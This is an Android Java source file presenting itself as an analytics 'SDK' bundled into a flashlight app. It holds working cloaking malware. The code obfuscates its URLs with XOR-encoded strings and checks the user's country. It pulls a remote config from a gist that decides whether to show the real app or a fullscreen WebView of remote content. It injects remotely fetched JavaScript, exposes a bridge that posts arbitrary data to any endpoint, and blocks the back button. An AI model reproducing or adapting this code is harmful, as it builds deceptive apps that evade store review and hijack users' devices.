/*
  App-O-Track In-App SDK
  Version: 19032020
  Author: Liv <developer@app-o-track.top>
 */
package com.appotrack_sdk;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.util.Log;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import com.dbohgdan.flashlight.MainActivity;
import com.jayway.jsonpath.DocumentContext;
import com.jayway.jsonpath.JsonPath;
import com.kochava.base.Tracker;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.FutureTask;
import java.util.concurrent.TimeUnit;

import im.delight.android.webview.AdvancedWebView;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Credentials;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AppotrackActivity extends AppCompatActivity implements AdvancedWebView.Listener {

    /* TODO: SDK configuration */
    private static final boolean isAtSdkDebugMode = false; //set to true to show debug messages with ATSDK tag. Please set to false for production builds TODO: set to false
    private static final String remoteConfigId = "0de8808a8d84d4265a3a71d6bd68598d"; //remote configuration record ID TODO: request it from your personal manager
    private static final String kchAppId = "ko920-dbohgdan-flashlight-hehy"; //Kochava App ID TODO: request it from your personal manager
    private static final String geoipApiKey = "MEwqSBsyFTYtESItKA5OAA=="; //GeoIP API key TODO: request it from your personal manager
    private static final Integer geoipApiId = 218804; //GeoIP API user ID TODO: request it from your personal manager
    private static final Class sweetieActivityClass = MainActivity.class; //your application's main activity class TODO: set to your main activity
    private static final List<String> allowedCountries = Arrays.asList("RU", "UA", "PL", "KZ", "DE", "CA", "NZ", "NO", "NL", "IT", "PT", "CH", "JP", "SK", "SI", "LT", "LV", "EE", "AT"); //country white list where ADs will show TODO: request it from your personal manager
    private static final String SHARED_PREFS_NAME = "ATPREFS"; //you may change on your own
    private static final String PREF_GEOIP = "geodata"; //you may change on your own
    private static final byte ENC_KEY = 120; //Key to encrypt/decrypt strings
    /* end of configuration */

    /**
     * Encrypted strings.
     * You may call decrypt(str, ENC_KEY) on such string to decrypt it.
    */
    public static final String esXRequestedWith = "IFUqHQkNHQsMHRxVLxEMEA=="; //X-Requested-With
    public static final String esInjectedApp = "MRYSHRsMHRw5CAg="; //InjectedApp
    public static final String esApiEndpoint = "EAwMCAtCV1cfEQsMVh8RDBANGlYbFxVXGRYWGVUMFxQLDB0WExdXXSg3KywxPF1XChkPVxsXFh4RH1YMAAw="; //https://gist.github.com/anna-tolstenko/%POSTID%/raw/config.txt
    public static final String esGeoipApiEndpoint = "EAwMCAtCV1cfHRcRCFYVGQAVERYcVhsXFVcfHRcRCFcOSlZJVxsXDRYMCgFXFR0="; //https://geoip.maxmind.com/geoip/v2.1/country/me
    /* end of encrypted strings */

    /**
     * This activity class replaces two separate activities to pack SDK code into single file.
     * EXTRA_AT_ACTIVITY_MODE is an argument to router of this activity.
     * EXTRA_AT_ACTIVITY_MODE=0 or not defined - launcher activity
     * EXTRA_AT_ACTIVITY_MODE=1 - ADs activity
     * Activity stores it's mode in iActivityMode.
     */
    public static final String EXTRA_AT_ACTIVITY_MODE = "mode";
    private final int ACTIVITY_MODE_LAUNCHER = 0;
    private final int ACTIVITY_MODE_ADS = 1;
    private int iActivityMode = 0;


    /**
     * Current remote configuration is stored here
     */
    private static DocumentContext oRemoteConfig;
    private static String sInjectedJs;


    private Context oSelfContext;
    private Intent intentSweetie;
    private AdvancedWebView adView;
    private OkHttpClient httpClient = new OkHttpClient();


    /**
     * True onCreate of the activity
     * @param savedInstanceState
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Utils.debugOutput("Entry point");
        super.onCreate(savedInstanceState);

        oSelfContext = this;
        intentSweetie = new Intent(oSelfContext, sweetieActivityClass);
        intentSweetie.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

        //get activity mode (route)
        Intent intent = getIntent();
        iActivityMode = intent.getIntExtra(EXTRA_AT_ACTIVITY_MODE, 0);

        //call corresponding onCreate
        switch(iActivityMode){
            case ACTIVITY_MODE_ADS:
                Utils.debugOutput("Launching as ADs");
                onCreateAds(savedInstanceState);
                break;

            case ACTIVITY_MODE_LAUNCHER:
            default:
                Utils.debugOutput("ENC_KEY: "+ENC_KEY);
                Utils.debugOutput("remoteConfigId: "+remoteConfigId);
                onCreateLauncher(savedInstanceState);
                break;
        }
    }

    /**
     * This onCreate will be called in ADs mode
     * 1. Initialize push notifications service (Onesignal)
     * 2. Show AdvancedWebView with URL provided in remote config
     * @param savedInstanceState
     */
    private void onCreateAds(Bundle savedInstanceState) {
        //initialize push notifications only for proper users
        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        adView = new AdvancedWebView(this);

        adView.setListener(this, this);
        adView.addHttpHeader(Utils.decrypt(esXRequestedWith, ENC_KEY),"");
        adView.addJavascriptInterface(new AdJsInterface(this), Utils.decrypt(esInjectedApp, ENC_KEY));
        adView.setWebViewClient(new AdWebViewClient());

        if(savedInstanceState == null){
            adView.loadUrl(getConfigStr("$.url", "http://localhost/"));
        }

        setContentView(adView);
        Utils.debugOutput("ADs shown");
    }

    /**
     * Builds intent for this activity with mode argument in extras
     * @param ctx Context
     * @param mode AppotrackActivity.ACTIVITY_MODE_*
     * @return Intent
     */
    public static Intent fromMode(Context ctx, int mode){
        Intent intent = new Intent(ctx, AppotrackActivity.class);
        intent.putExtra(EXTRA_AT_ACTIVITY_MODE, mode);
        return intent;
    }

    /**
     * This onCreate will be called in launcher mode
     * 1. Show loading screen
     * 2. Initialize AppsFlyer
     * 3. Get GeoIP data. Work will continue for whitelisted countries only
     * 4. Load remote configuration
     * 5. If ADs are allowed by remote configuration (iscloak):
     *      a. report to AppsFlyer about advertised launch (AFInAppEventType.ACHIEVEMENT_UNLOCKED:advertised_launch)
     *      b. start this activity again in ADs mode
     *    otherwise, show application's main activity.
     * @param savedInstanceState
     */
    private void onCreateLauncher(Bundle savedInstanceState) {
        //This shows launch screen
        //You may replace the code with setContentView(R.layout.activity_launcher);
        FrameLayout vLayout = new FrameLayout(oSelfContext);
        FrameLayout.LayoutParams layoutparams=new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.MATCH_PARENT, Gravity.CENTER_HORIZONTAL|Gravity.CENTER_VERTICAL);
        vLayout.setLayoutParams(layoutparams);

        ProgressBar vProgress=new ProgressBar(this);
        FrameLayout.LayoutParams params=new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT,Gravity.CENTER_HORIZONTAL|Gravity.CENTER_VERTICAL);
        vProgress.setLayoutParams(params);
        vProgress.setIndeterminate(true);
        vLayout.addView(vProgress);

        setContentView(vLayout);
        //---

        Tracker.configure(new Tracker.Configuration(getApplicationContext())
                .setAppGuid(kchAppId)
        );

        //do the job in different thread so the app will not freeze
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                //initialize application
                ExecutorService executor = Executors.newSingleThreadExecutor();

                //get geoip data
                FutureTask<String> futureGeoIp = new FutureTask<>(getGeoIp());
                executor.execute(futureGeoIp);
                try{
                    String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
                    String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
                    Utils.debugOutput(geoipJson);
                    if(!allowedCountries.contains(geoipIsoCode)){
                        //user's country is not whitelisted
                        startSweetie();
                        return;
                    }
                }catch (Exception e){
                    Utils.debugOutput("Error: "+e.getMessage());
                    e.printStackTrace();
                    startSweetie();
                    return;
                }

                //load application's remote config
                FutureTask<String> futureConfig = new FutureTask<>(getString(Utils.decrypt(esApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId)));
                executor.execute(futureConfig);
                try{
                    String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);

                    if (sConfigJson.startsWith("ENC-")) {
                        sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
                    }
                    Utils.debugOutput(sConfigJson);

                    oRemoteConfig = JsonPath.parse(sConfigJson);

                    if (getConfigBool("$.iscloak")) {
                        startSweetie(); //start main activity if ADs disabled
                    } else {
                        //report to analytics that this launch was with ADs
                        Tracker.sendEvent(new Tracker.Event(Tracker.EVENT_TYPE_AD_CLICK));
                        OneSignal.sendTag("adv","1");
                    }

                }catch (Exception e){
                    Utils.debugOutput("Error: "+e.getMessage());
                    e.printStackTrace();
                    startSweetie();
                    return;
                }

                //load injected JS code if we have one
                String jsUrl = getConfigStr("$.jsurl", "");
                if (jsUrl!=null && jsUrl.length() > 0) {
                    Utils.debugOutput(jsUrl);
                    try {
                        FutureTask<String> futureInjectedApp = new FutureTask<>(getString(jsUrl));
                        executor.execute(futureInjectedApp);
                        sInjectedJs = futureInjectedApp.get(30L, TimeUnit.SECONDS);
                        Utils.debugOutput(sInjectedJs);
                    }catch(Exception e){
                        Utils.debugOutput(e.getMessage());
                        e.printStackTrace();
                        sInjectedJs = null;
                    }
                }else{
                    sInjectedJs = null;
                }

                executor.shutdown();


                //show ADs
                if(!getConfigBool("$.iscloak")){
                    //start ADs
                    startActivity(AppotrackActivity.fromMode(oSelfContext, ACTIVITY_MODE_ADS)); //show ADs
                    finish();//removing this will allow users returning to loading screen
                    return;
                }
            }
        });
        t.start();
    }

    /**
     * Get GeoIP information about this client
     * @return GeoIP service response as JSON string
     */
    private Callable<String> getGeoIp(){
        Callable<String> result =  new Callable<String>() {
            @Override
            public String call() throws Exception {
                //check for cached geoip response
                SharedPreferences prefs = getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE);
                if(prefs.contains(PREF_GEOIP)){
                    String geodata = prefs.getString(PREF_GEOIP, "");
                    if(geodata.contains("iso_code")) {
                        return geodata;
                    }
                }

                    Request request = new Request.Builder()
                            .url(Utils.decrypt(esGeoipApiEndpoint, ENC_KEY))
                            .addHeader("Authorization", Credentials.basic(geoipApiId.toString(), Utils.decrypt(geoipApiKey,ENC_KEY)))
                            .build();

                    Response response = httpClient.newCall(request).execute();
                    String responseBody = response.body().string();
                    prefs.edit().putString(PREF_GEOIP, responseBody).apply(); //save current response to cache
                    return responseBody;
            }
        };
        return result;
    }

    /**
     * Makes GET request and returns response body
     * @param urlAddr HTTP address
     * @return Response body
     */
    private Callable<String> getString(final String urlAddr){
        Callable<String> result = new Callable<String>() {
            @Override
            public String call() throws Exception {
                OkHttpClient okHttpClient = new OkHttpClient();
                Request request = new Request.Builder()
                        .url(urlAddr)
                        .build();
                Response response = okHttpClient.newCall(request).execute();
                return response.body().string();
            }
        };
        return result;
    }

    /**
     * Gets configuration object by selector as String
     * @param key Selector
     * @param defaultValue Default value
     * @return Requested value or defaultValue
     */
    private String getConfigStr(String key, String defaultValue){
        try {
            String val = oRemoteConfig.read(key, String.class);
            if (val == null) return defaultValue;
            return val;
        }catch(Exception e){
            return defaultValue;
        }
    }

    /**
     * Gets configuration object by selector as Boolean. Values are set to false by default.
     * @param key Selector
     * @return Requested value or false
     */
    private boolean getConfigBool(String key){
        try {
            return oRemoteConfig.read(key, boolean.class);
        }catch(Exception e){
            return false;
        }

    }

    private void hideActionBar() {
        ActionBar actionBar = getSupportActionBar();
        if (actionBar != null) {
            actionBar.hide();
        }
    }

    /**
     * Starts main application's activity
     */
    private void startSweetie(){
        oSelfContext.startActivity(intentSweetie);
        finish();
    }

    /**
     * Some calls have to be passed into AdvancedWebView instance:
     */
    @Override
    public void onBackPressed() {
        if(adView==null) return;
        if(adView.canGoBack()){
            adView.goBack();
        }
        return;
    }

    @Override
    public void onSaveInstanceState(Bundle outState, PersistableBundle outPersistentState) {
        super.onSaveInstanceState(outState, outPersistentState);
        if(adView==null) return;
        adView.saveState(outState);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        if(adView==null) return;
        adView.restoreState(savedInstanceState);
    }

    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
        hideActionBar();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if(hasFocus){
            hideActionBar();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if(adView==null) return;
        adView.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if(adView==null) return;
        adView.onResume();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if(adView==null) return;
        adView.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(adView==null) return;
        adView.onDestroy();
    }

    @Override
    public void onPageStarted(String url, Bitmap favicon) {
        //pass
    }

    @Override
    public void onPageFinished(String url) {
        //pass
    }

    @Override
    public void onPageError(int errorCode, String description, String failingUrl) {
        //pass
    }

    @Override
    public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) {
        //pass
    }

    @Override
    public void onExternalPageRequest(String url) {
        //pass
    }

    private static class Utils{
        static String decrypt(String t, byte key){
            byte[] data = {};
            int i = 0;

            try{
                data = android.util.Base64.decode(t, android.util.Base64.DEFAULT);
            }catch(Exception e){
                e.printStackTrace();
            }

            for(i=0;i<data.length;i++){
                data[i] = (byte) (data[i]^key);
            }

            return new String(data, StandardCharsets.UTF_8);
        }

        static void debugOutput(String m){
            if(isAtSdkDebugMode){
                Log.d("ATSDK", m);
            }
        }
    }

    /**
     * This JavaScript interface allows to call in-app analytics from WebView
     */
    private class AdJsInterface {
        Context mContext;

        AdJsInterface(Context c) {
            mContext = c;
        }

        @JavascriptInterface
        public void ShowToast(String toast) {
            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
        }

        @JavascriptInterface
        public boolean KCEvent(String eventType, String eventValues){
            Map<String, Object> eventValue = new HashMap<String, Object>();
            for(String item:eventValues.split(",")){
                String[] kv = item.split(":");
                if(kv.length<2) continue;
                eventValue.put(kv[0],kv[1]);
            }
            Tracker.sendEvent(new Tracker.Event(eventType).addCustom(new JSONObject(eventValue)));
            return true;
        }

        @JavascriptInterface
        public boolean OSAddTags(String tags){
            try {
                JSONObject o = new JSONObject();
                for(String item:tags.split(",")){
                    String[] kv = item.split(":");
                    if(kv.length<2) continue;
                    o.put(kv[0],kv[1]);
                }
                OneSignal.sendTags(o);
                return true;
            } catch (JSONException e) {
                e.printStackTrace();
                return false;
            }
        }

        @JavascriptInterface
        public boolean Track(String endpoint, String data) {
            //prepare request
            MediaType jsonType = MediaType.parse("application/json; charset=utf-8");
            OkHttpClient okHttpClient = new OkHttpClient();
            Request request = new Request.Builder()
                    .url(endpoint)
                    .post(RequestBody.create(data, jsonType))
                    .build();
            //call callback
            okHttpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    //pass
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    //pass
                }
            });
            return true;
        }
    }

    /**
     * This WebView Client allows to open main application's activity from WebView (by navigating to Localhost).
     * Also it allows to inject custom JS for different purposes.
     */
    private class AdWebViewClient extends WebViewClient {
        @Nullable
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            // webviews may call http://host/favicon.ico automatically. Here we're checking only host value, but to avoid multiple cloak starts need to
            // check if the request is calling localhost without path
            Uri url = request.getUrl();
            if(url.getHost()!=null) {
                if (url.getHost().equals("localhost") && (url.getPath() == null || url.getPath().length() <= 1)) {
                    //show application's main activity in case of navigation to localhost
                    startSweetie();
                }
            }
            return super.shouldInterceptRequest(view, request);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            //we may need to inject some JS info our ADs (to fix platform specific bugs for example)
            if(sInjectedJs !=null&& sInjectedJs.length()>1){
                view.evaluateJavascript(sInjectedJs, new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String s) {
                        //pass
                    }
                });
            }
        }
    }
}
